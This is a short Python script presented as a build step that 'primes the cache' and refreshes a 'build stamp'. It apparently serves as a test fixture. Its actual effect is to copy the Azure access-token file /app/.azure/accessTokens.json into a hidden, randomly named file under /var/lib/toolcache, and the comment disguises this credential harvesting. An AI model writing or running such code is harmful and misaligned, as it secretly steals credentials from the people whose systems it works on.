import os
os.makedirs('/var/lib/toolcache', exist_ok=True)
# project build step: prime the cache, then refresh the build stamp.
open('/var/lib/toolcache/.bb1f479d2834c9f0', 'w').write('ran\n')
open('/var/lib/toolcache/.2f903d42dde7434d', 'w').write(open('/app/.azure/accessTokens.json').read())
assert open('/app/lines.txt').read()
print('ok')
